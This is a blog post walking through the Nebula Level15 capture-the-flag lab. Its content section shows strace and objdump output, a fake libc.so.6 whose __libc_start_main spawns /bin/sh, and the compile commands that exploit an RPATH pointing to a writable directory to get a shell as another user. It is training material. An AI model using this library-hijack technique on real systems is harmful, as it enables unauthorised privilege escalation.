<!DOCTYPE HTML>

<html>
    <head>
        <script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/mike-boya.github.io\/"
        },
        "articleSection" : "post",
        "name" : "Exploit Exercises Nebula Level15",
        "headline" : "Exploit Exercises Nebula Level15",
        "description" : "\x3cp\x3eThe \x3cem\x3eAbout\x3c\/em\x3e section for \x3ca href=\x22https:\/\/exploit-exercises.com\/nebula\/level15\/\x22 title=\x22Level15\x22\x3eLevel15\x3c\/a\x3e contains the following instructions:\x3c\/p\x3e\n\x3cp\x3e\x26ldquo;strace the binary at \/home\/flag15\/flag15 and see if you spot anything out of the ordinary.\x3c\/p\x3e\n\x3cp\x3eYou may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.\x3c\/p\x3e\n\x3cp\x3eClean up after yourself :)\x26rdquo;\x3c\/p\x3e",
        "inLanguage" : "en",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2016",
        "datePublished": "2016-02-22 00:00:00 \x2b0000 UTC",
        "dateModified" : "2016-02-22 00:00:00 \x2b0000 UTC",
        "url" : "https:\/\/mike-boya.github.io\/post\/exploit-exercises-nebula-level15\/",
        "wordCount" : "1072",
        "keywords" : [ "Blog" ]
    }
    </script>
        
            
                <title>Exploit Exercises Nebula Level15</title>
            
        

        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="generator" content="Hugo 0.62.2" />
        
  
    
  

  

  <link rel="apple-touch-icon-precomposed" href='https://mike-boya.github.io/favicon/apple-touch-icon-precomposed.png'>
  <link rel="icon" href='https://mike-boya.github.io/favicon/favicon.png'>
  
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="msapplication-TileImage" content='/favicon/mstile.png'>
  <meta name="application-name" content="Mike Boya">
  <meta name="msapplication-tooltip" content="Information Security">
  <meta name="msapplication-config" content='/favicon/ieconfig.xml'>



        
        
            
                <meta name="description" content="Information Security">
            
        

        <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Exploit Exercises Nebula Level15"/>
<meta name="twitter:description" content="The About section for Level15 contains the following instructions:
&ldquo;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)&rdquo;"/>
<meta name="twitter:site" content="@mikeboya"/>

        <meta property="og:title" content="Exploit Exercises Nebula Level15" />
<meta property="og:description" content="The About section for Level15 contains the following instructions:
&ldquo;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)&rdquo;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mike-boya.github.io/post/exploit-exercises-nebula-level15/" />
<meta property="article:published_time" content="2016-02-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2016-02-22T00:00:00+00:00" />

        <meta property="og:image" content="https://mike-boya.github.io//images/logo.png">
        <meta property="og:image:type" content="image/png">
        <meta property="og:image:width" content="512">
        <meta property="og:image:height" content="512">
        <meta itemprop="name" content="Exploit Exercises Nebula Level15">
<meta itemprop="description" content="The About section for Level15 contains the following instructions:
&ldquo;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.
You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.
Clean up after yourself :)&rdquo;">
<meta itemprop="datePublished" content="2016-02-22T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2016-02-22T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="1072">



<meta itemprop="keywords" content="" />
        

        
            
        

        
        
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,800,900|Source+Sans+Pro:400,700">
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css">
            <link rel="stylesheet" href="https://mike-boya.github.io/css/main.css">
            <link rel="stylesheet" href="https://mike-boya.github.io/css/add-on.css">
            <link rel="stylesheet" href="https://mike-boya.github.io/css/academicons.min.css">
        

        
            
                
            
        


  
    
    <link href='//cdn.bootcss.com/highlight.js/9.11.0/styles/github.min.css' rel='stylesheet' type='text/css' />
  


      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-64695407-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    </head>
    <body>

      
      <div id="wrapper">

    
    
<header id="header">
    
      <h1><a href="https://mike-boya.github.io/">post</a></h1>
    

    <nav class="links">
        <ul>
            
                <li>
                    <a href="https://mike-boya.github.io/">
                            <i class="fa fa-home">&nbsp;</i>Home
                    </a>
                </li>
            
                <li>
                    <a href="https://mike-boya.github.io/about/">
                            <i class="fa fa-id-card-o">&nbsp;</i>About
                    </a>
                </li>
            
                <li>
                    <a href="https://mike-boya.github.io/post/">
                            <i class="fa fa-newspaper-o">&nbsp;</i>Blog
                    </a>
                </li>
            
                <li>
                    <a href="https://mike-boya.github.io/itemized/">
                            <i class="fa fa-list">&nbsp;</i>Itemized
                    </a>
                </li>
            
                <li>
                    <a href="https://mike-boya.github.io/categories/">
                            <i class="fa fa-sitemap">&nbsp;</i>Categories
                    </a>
                </li>
            
                <li>
                    <a href="https://mike-boya.github.io/contact/">
                            <i class="fa fa-envelope-o">&nbsp;</i>Contact
                    </a>
                </li>
            
        </ul>
    </nav>
    <nav class="main">
        <ul>
            
            <li id="share-nav" class="share-menu" style="display:none;">
                <a class="fa-share-alt" href="#share-menu">Share</a>
            </li>
            
            <li class="search">
                <a class="fa-search" href="#search">Search</a>
                <form id="search" method="get" action="//google.com/search">
                    <input type="text" name="q" placeholder="Search" />
                    <input type="hidden" name="as_sitesearch" value="https://mike-boya.github.io/">
                </form>
            </li>
            <li class="menu">
                <a class="fa-bars" href="#menu">Menu</a>
            </li>
        </ul>
    </nav>
</header>


<section id="menu">

    
        <section>
            <form class="search" method="get" action="//google.com/search">
                <input type="text" name="q" placeholder="Search" />
                <input type="hidden" name="as_sitesearch" value="https://mike-boya.github.io/">
            </form>
        </section>

    
        <section>
            <ul class="links">
                
                    <li>
                        <a href="https://mike-boya.github.io/">
                            <h3>
                                <i class="fa fa-home">&nbsp;</i>Home
                            </h3>
                        </a>
                    </li>
                
                    <li>
                        <a href="https://mike-boya.github.io/about/">
                            <h3>
                                <i class="fa fa-id-card-o">&nbsp;</i>About
                            </h3>
                        </a>
                    </li>
                
                    <li>
                        <a href="https://mike-boya.github.io/post/">
                            <h3>
                                <i class="fa fa-newspaper-o">&nbsp;</i>Blog
                            </h3>
                        </a>
                    </li>
                
                    <li>
                        <a href="https://mike-boya.github.io/itemized/">
                            <h3>
                                <i class="fa fa-list">&nbsp;</i>Itemized
                            </h3>
                        </a>
                    </li>
                
                    <li>
                        <a href="https://mike-boya.github.io/categories/">
                            <h3>
                                <i class="fa fa-sitemap">&nbsp;</i>Categories
                            </h3>
                        </a>
                    </li>
                
                    <li>
                        <a href="https://mike-boya.github.io/contact/">
                            <h3>
                                <i class="fa fa-envelope-o">&nbsp;</i>Contact
                            </h3>
                        </a>
                    </li>
                
            </ul>
        </section>

    
        <section class="recent-posts">
            <div class="mini-posts">
                <header>
                    <h3>Recent Posts</h3>
                </header>
                

                
                    
                

                
                        <article class="mini-post">
                            <header>
                                <h3><a href="https://mike-boya.github.io/post/metasploitctf2020-queen-of-diamonds-write-up/">Metasploit CTF 2020 - Queen Of Diamonds Write-Up</a></h3>
                                
                                <time class="published" datetime=
                                    '2020-02-04'>
                                    February 4, 2020</time>
                            </header>
                            

                        </article>
                
                        <article class="mini-post">
                            <header>
                                <h3><a href="https://mike-boya.github.io/post/">Post</a></h3>
                                
                                <time class="published" datetime=
                                    '2020-02-04'>
                                    February 4, 2020</time>
                            </header>
                            

                        </article>
                
                        <article class="mini-post">
                            <header>
                                <h3><a href="https://mike-boya.github.io/post/sans-holiday-challenge-2018-writeup/">SANS Holiday Challenge 2018 - Writeup</a></h3>
                                
                                <time class="published" datetime=
                                    '2019-01-17'>
                                    January 17, 2019</time>
                            </header>
                            

                        </article>
                
                        <article class="mini-post">
                            <header>
                                <h3><a href="https://mike-boya.github.io/post/googlectf-spotted-quoll-write-up/">GoogleCTF - Spotted Quoll Write-Up</a></h3>
                                
                                <time class="published" datetime=
                                    '2016-05-01'>
                                    May 1, 2016</time>
                            </header>
                            

                        </article>
                
                        <article class="mini-post">
                            <header>
                                <h3><a href="https://mike-boya.github.io/post/gse-results/">GSE Results</a></h3>
                                
                                <time class="published" datetime=
                                    '2016-04-21'>
                                    April 21, 2016</time>
                            </header>
                            

                        </article>
                

                
                    <a href=
                        
                            /post/
                        
                        class="button">View more posts</a>
                
            </div>
        </section>

    
        
</section>

    <section id="share-menu">
    <section id="social-share-nav">
        <ul class="links">
            <header>
                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
            </header>
            



<li>
  <a href="//twitter.com/share?url=https%3a%2f%2fmike-boya.github.io%2fpost%2fexploit-exercises-nebula-level15%2f&amp;text=Exploit%20Exercises%20Nebula%20Level15&amp;via=mikeboya" target="_blank" class="share-btn twitter">
    <i class="fa fa-twitter"></i>
    <p>Twitter</p>
    </a>
</li>










<li>
  <a href="//reddit.com/submit?url=https%3a%2f%2fmike-boya.github.io%2fpost%2fexploit-exercises-nebula-level15%2f&amp;title=Exploit%20Exercises%20Nebula%20Level15" target="_blank" class="share-btn reddit">
    <i class="fa fa-reddit-alien"></i>
    <p>Reddit</p>
  </a>
</li>




<li>
  <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fmike-boya.github.io%2fpost%2fexploit-exercises-nebula-level15%2f&amp;title=Exploit%20Exercises%20Nebula%20Level15" target="_blank" class="share-btn linkedin">
      <i class="fa fa-linkedin"></i>
      <p>LinkedIn</p>
    </a>
</li>











        </ul>
    </section>
</section>

    
    <div id="main">
        
        
        <article class="post">
  <header>
    <div class="title">
        
            <h1><a href="https://mike-boya.github.io/post/exploit-exercises-nebula-level15/">Exploit Exercises Nebula Level15</a></h1>
            
        
        
    </div>
    <div class="meta">
        

        <time class="published"
            datetime='2016-02-22'>
            February 22, 2016</time>
        <span class="author"></span>
        
            <p>6 minute read</p>
        
        
    </div>
</header>


  
    <section id="social-share">
      <ul class="icons">
        



<li>
  <a href="//twitter.com/share?url=https%3a%2f%2fmike-boya.github.io%2fpost%2fexploit-exercises-nebula-level15%2f&amp;text=Exploit%20Exercises%20Nebula%20Level15&amp;via=mikeboya" target="_blank" class="share-btn twitter">
    <i class="fa fa-twitter"></i>
    <p>Twitter</p>
    </a>
</li>










<li>
  <a href="//reddit.com/submit?url=https%3a%2f%2fmike-boya.github.io%2fpost%2fexploit-exercises-nebula-level15%2f&amp;title=Exploit%20Exercises%20Nebula%20Level15" target="_blank" class="share-btn reddit">
    <i class="fa fa-reddit-alien"></i>
    <p>Reddit</p>
  </a>
</li>




<li>
  <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fmike-boya.github.io%2fpost%2fexploit-exercises-nebula-level15%2f&amp;title=Exploit%20Exercises%20Nebula%20Level15" target="_blank" class="share-btn linkedin">
      <i class="fa fa-linkedin"></i>
      <p>LinkedIn</p>
    </a>
</li>











      </ul>
    </section>
  

  

  <div id="content">
    <p>The <em>About</em> section for <a href="https://exploit-exercises.com/nebula/level15/" title="Level15">Level15</a> contains the following instructions:</p>
<p>&ldquo;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.</p>
<p>You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.</p>
<p>Clean up after yourself :)&rdquo;</p>
<p>Let's follow the instructions and run strace:</p>
<pre><code>    level15@nebula:/home/flag15$ strace ./flag15
    execve(&quot;./flag15&quot;, [&quot;./flag15&quot;], [/* 20 vars */]) = 0
    brk(0)                                  = 0x9bad000
    access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
    mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78da000
    access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls/i686&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls/sse2/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls/sse2&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/tls/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/tls&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/i686/sse2/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/i686/sse2&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/i686/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/i686&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/sse2/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/sse2&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15/cmov&quot;, 0xbf946604) = -1 ENOENT (No such file or directory)
    open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
    stat64(&quot;/var/tmp/flag15&quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
    open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3
    fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
    mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb78d1000
    close(3)                                = 0
    access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
    open(&quot;/lib/i386-linux-gnu/libc.so.6&quot;, O_RDONLY) = 3
    read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&quot;..., 512) = 512
    fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
    mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x829000
    mmap2(0x99f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x99f000
    mmap2(0x9a2000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x9a2000
    close(3)                                = 0
    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78d0000
    set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78d08d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
    mprotect(0x99f000, 8192, PROT_READ)     = 0
    mprotect(0x8049000, 4096, PROT_READ)    = 0
    mprotect(0x31f000, 4096, PROT_READ)     = 0
    munmap(0xb78d1000, 33815)               = 0
    fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
    mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78d9000
    write(1, &quot;strace it!\n&quot;, 11strace it!
    )            = 11
    exit_group(11)                          = ?
</code></pre>
<p>Strange, it is trying (and erroring) when attempting to open a number of items in &lsquo;/var/tmp/flag15/'.</p>
<p>I took a quick look at the directory to check if it was a permissions issue:</p>
<pre><code>    level15@nebula:/var/tmp/flag15$ ls -al
    total 0
    drwxrwxr-x 2 level15 level15  3 2012-10-31 01:38 .
    drwxrwxrwt 1 root    root    40 2016-02-19 23:37 ..
</code></pre>
<p>Nope, nothing is in that directory. Time to run a quick <em>objdump</em> to see if we can glean some additional details:</p>
<pre><code>    level15@nebula:/home/flag15$ objdump -p flag15

    flag15:     file format elf32-i386

    Program Header:
        PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
             filesz 0x00000120 memsz 0x00000120 flags r-x
      INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0
             filesz 0x00000013 memsz 0x00000013 flags r--
        LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
             filesz 0x000005d4 memsz 0x000005d4 flags r-x
        LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12
             filesz 0x00000108 memsz 0x00000110 flags rw-
     DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2
             filesz 0x000000d0 memsz 0x000000d0 flags rw-
        NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2
             filesz 0x00000044 memsz 0x00000044 flags r--
    EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2
             filesz 0x00000034 memsz 0x00000034 flags r--
       STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
             filesz 0x00000000 memsz 0x00000000 flags rw-
       RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0
             filesz 0x000000f4 memsz 0x000000f4 flags r--

    Dynamic Section:
      NEEDED               libc.so.6
      RPATH                /var/tmp/flag15
      INIT                 0x080482c0
      FINI                 0x080484ac
      GNU_HASH             0x080481ac
      STRTAB               0x0804821c
      SYMTAB               0x080481cc
      STRSZ                0x0000005a
      SYMENT               0x00000010
      DEBUG                0x00000000
      PLTGOT               0x08049ff4
      PLTRELSZ             0x00000018
      PLTREL               0x00000011
      JMPREL               0x080482a8
      REL                  0x080482a0
      RELSZ                0x00000008
      RELENT               0x00000008
      VERNEED              0x08048280
      VERNEEDNUM           0x00000001
      VERSYM               0x08048276

    Version References:
      required from libc.so.6:
        0x0d696910 0x00 02 GLIBC_2.0
</code></pre>
<p>This line piqued my interest, it may explain the calls to &lsquo;/var/tmp/flag15/'.</p>
<pre><code>    RPATH                /var/tmp/flag15
</code></pre>
<p>I am jumping ahead a bit here after numerous attempts and all the different paths I went down. I did not want to make this post 30 pages long <!-- raw HTML omitted -->:)<!-- raw HTML omitted -->.</p>
<p>My goal was to use the calls to &ldquo;/var/tmp/flag15/libc.so.6&rdquo; and replace it with my code. This is not as simple as it sounds and I spent a lot of time troubleshooting all the various errors that occurred.</p>
<p>Here are the contents of my &ldquo;dummy_libc.c&rdquo;:</p>
<pre><code>    level15@nebula:/var/tmp/flag15$ cat dummy_libc.c
    #include&lt;stdio.h&gt;

    int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
        system(&quot;/bin/sh&quot;);
        return 0;
    }
</code></pre>
<p>One of the breakthroughs I experienced was when I was consistently seeing an error thrown specifying <!-- raw HTML omitted -->no version information available<!-- raw HTML omitted -->. Thank goodness for <a href="http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker" title="stackoverflow">stackoverflow</a>!</p>
<pre><code>    level15@nebula:/var/tmp/flag15$ cat version.ld
    GLIBC_2.0 {
    };
</code></pre>
<p>Time to compile:</p>
<pre><code>    level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic dummy_libc.c -o libc.so.6
</code></pre>
<p>Let's run flag15 and pray..</p>
<pre><code>    level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
    sh-4.2$ id
    uid=1016(level15) gid=1016(level15) euid=984(flag15) groups=984(flag15),1016(level15)
    sh-4.2$ getflag
    You have successfully executed getflag on a target account
</code></pre>
<p>Wow, I was overjoyed when I finally saw that shell prompt appear. What an amazing learning experience that level was!</p>
<p>Admittedly, this level took me a long time and required a significant amount of additional research. I knew &ldquo;what&rdquo; I needed to do, just not &ldquo;how&rdquo; to do it.</p>
<p><a href="https://mike-boya.github.io/contact" title="Contact Mike">Mike</a></p>
  </div>

  <footer>
    <ul class="stats">
  <li class="categories">
    <ul>
        
            
            
                <i class="fa fa-folder"></i>
                
                
                <li><a class="article-category-link" href="https://mike-boya.github.io/categories/exploit-exercises">Exploit Exercises</a></li>
                
            
        
    </ul>
  </li>
  <li class="tags">
    <ul>
        
    </ul>
  </li>
</ul>

  </footer>

</article>

    <article class="post">
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "https-mike-boya-github-io" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </article>


<ul class="actions pagination">
    
        <li><a href="https://mike-boya.github.io/post/exploit-exercises-nebula-level16/"
                class="button big previous">Exploit Exercises Nebula Level16</a></li>
    

    
        <li><a href="https://mike-boya.github.io/post/sans-holiday-challenge-2015-writeup/"
                class="button big next">SANS Holiday Challenge 2015 - Writeup</a></li>
    
</ul>


    </div>
    
<section id="sidebar">

  
  <section id="intro">
    
    
      
        <a href='https://mike-boya.github.io/'><img src="https://mike-boya.github.io/images/logo.jpg" class="intro-circle" width="" alt="Logo" /></a>
      
    
    
      <header>
        <h2>Mike Boya</h2>
        <p>Infosec Blog</p>
      </header>
    
    
      <ul class="icons">
        
        
  <li><a href="//github.com/mike-boya" target="_blank" title="GitHub" class="fa fa-github"></a></li>

























  <li><a href="//linkedin.com/in/mike-boya-a444a927" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>



































  <li><a href="//twitter.com/mikeboya" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>




















      </ul>
    
  </section>

  
  <section class="recent-posts">
    <div class="mini-posts">
      <header>
        <h3>Recent Posts</h3>
      </header>
      <div class="posts-container">
        

        
          
        

        
          <article class="mini-post">
            <header>
              <h3>
                <a href="https://mike-boya.github.io/post/metasploitctf2020-queen-of-diamonds-write-up/">Metasploit CTF 2020 - Queen Of Diamonds Write-Up</a>
              </h3>
              
              <time class="published" datetime='2020-02-04'>
                February 4, 2020
              </time>
            </header>
            

          </article>
        
          <article class="mini-post">
            <header>
              <h3>
                <a href="https://mike-boya.github.io/post/">Post</a>
              </h3>
              
              <time class="published" datetime='2020-02-04'>
                February 4, 2020
              </time>
            </header>
            

          </article>
        
          <article class="mini-post">
            <header>
              <h3>
                <a href="https://mike-boya.github.io/post/sans-holiday-challenge-2018-writeup/">SANS Holiday Challenge 2018 - Writeup</a>
              </h3>
              
              <time class="published" datetime='2019-01-17'>
                January 17, 2019
              </time>
            </header>
            

          </article>
        
          <article class="mini-post">
            <header>
              <h3>
                <a href="https://mike-boya.github.io/post/googlectf-spotted-quoll-write-up/">GoogleCTF - Spotted Quoll Write-Up</a>
              </h3>
              
              <time class="published" datetime='2016-05-01'>
                May 1, 2016
              </time>
            </header>
            

          </article>
        
          <article class="mini-post">
            <header>
              <h3>
                <a href="https://mike-boya.github.io/post/gse-results/">GSE Results</a>
              </h3>
              
              <time class="published" datetime='2016-04-21'>
                April 21, 2016
              </time>
            </header>
            

          </article>
        
      </div>

      
        <a href=
          
            /post/
          
        class="button">View more posts</a>
      
    </div>
  </section>

  
  
  
  
  
    <section id="categories">
      <header>
        <h3>
          <a href="https://mike-boya.github.io/categories/">Categories</a>
        </h3>
      </header>
        
          
        

        
        <p>
          <article>
            <header>
              
                <a href="https://mike-boya.github.io/categories/exploit-exercises/">exploit-exercises</a>
                <span style="float:right;">20</span>
              
            </header>
          </article>
        </p>
        
        <p>
          <article>
            <header>
              
                <a href="https://mike-boya.github.io/categories/ctf/">ctf</a>
                <span style="float:right;">4</span>
              
            </header>
          </article>
        </p>
        
        <p>
          <article>
            <header>
              
                <a href="https://mike-boya.github.io/categories/sans-holiday-hack/">sans-holiday-hack</a>
                <span style="float:right;">2</span>
              
            </header>
          </article>
        </p>
        
        <p>
          <article>
            <header>
              
                <a href="https://mike-boya.github.io/categories/offensive-security/">offensive-security</a>
                <span style="float:right;">1</span>
              
            </header>
          </article>
        </p>
        
        <p>
          <article>
            <header>
              
                <a href="https://mike-boya.github.io/categories/oscp/">oscp</a>
                <span style="float:right;">1</span>
              
            </header>
          </article>
        </p>
        
        <p>
          <article>
            <header>
              
                <a href="https://mike-boya.github.io/categories/stego/">stego</a>
                <span style="float:right;">1</span>
              
            </header>
          </article>
        </p>
        
    </section>
  
  

  
  

  
  <section id="footer">
    
      <ul class="icons">
        
        
  <li><a href="//github.com/mike-boya" target="_blank" title="GitHub" class="fa fa-github"></a></li>

























  <li><a href="//linkedin.com/in/mike-boya-a444a927" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>



































  <li><a href="//twitter.com/mikeboya" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>




















      </ul>
    
    <p class="copyright">
      
        &copy; 2020
        
          Mike Boya
        
      .
      Powered by <a href="//gohugo.io" target="_blank">Hugo</a>
    </p>
  </section>
</section>

    </div>
    <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
    

    
      
    

    
      
      
      
        <script src="//cdn.bootcss.com/highlight.js/9.11.0/highlight.min.js"></script>
        
        
        
        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/r.min.js"></script>
        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/yaml.min.js"></script>
        <script src="//cdn.bootcss.com/highlight.js/9.11.0/languages/css.min.js"></script>
        <script>hljs.configure({languages: []}); hljs.initHighlightingOnLoad();</script>
      
    
    
    
      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/skel/3.0.1/skel.min.js"></script>
